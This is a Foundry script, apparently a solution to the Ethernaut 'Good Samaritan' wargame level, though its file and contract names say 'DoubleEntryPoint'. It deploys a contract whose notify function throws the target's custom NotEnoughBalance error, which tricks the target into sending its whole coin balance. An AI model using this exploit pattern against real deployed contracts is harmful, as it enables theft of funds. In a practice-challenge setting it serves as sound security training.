// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GoodSamaritan, Coin, Wallet} from "../src/DoubleEntryPoint.sol";
import {Script, console} from "forge-std/script.sol";

contract DoubleEntryPointSolution is Script {
    GoodSamaritan goodSamaritan = GoodSamaritan(0x9537893F2eC08a362D089F4e7987057323D35963);
    address myAddress = vm.envAddress("MY_ADDRESS");
    Coin coinInterface = goodSamaritan.coin();
    Wallet walletInterface = goodSamaritan.wallet();
    uint256 myBalance = coinInterface.balances(myAddress);

    error NotEnoughBalance();

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Good samaritan balance is : ", coinInterface.balances(address(walletInterface)));
        BadSamaritan badSamaritan = new BadSamaritan();
        badSamaritan.attack();

        console.log("My balance is : ", coinInterface.balances(myAddress));
        console.log("Good samaritan balance is : ", coinInterface.balances(address(walletInterface)));
        console.log("Bad samaritan balance is : ", coinInterface.balances(address(badSamaritan)));
        vm.stopBroadcast();
    }
}

contract BadSamaritan {
    error NotEnoughBalance();

    GoodSamaritan goodsamaritan = GoodSamaritan(0x9537893F2eC08a362D089F4e7987057323D35963); //ethernaut instance address

    function attack() external {
        goodsamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
